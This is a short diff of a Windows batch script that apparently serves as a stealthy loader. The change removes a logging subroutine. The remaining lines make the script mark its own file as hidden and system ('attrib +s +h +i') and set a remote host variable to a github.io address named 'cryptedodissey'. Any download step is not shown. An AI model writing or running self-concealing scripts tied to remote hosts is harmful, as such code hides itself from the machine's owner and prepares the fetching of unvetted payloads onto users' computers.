@@ -1,9 +1,5 @@
 @echo off
 setlocal 
-call :LOG >> "%temp%\batch.tmp"
-exit /B
-
-:LOG
 attrib +s +h +i "%~f0"
 
 set host=https://cryptedodissey.github.io
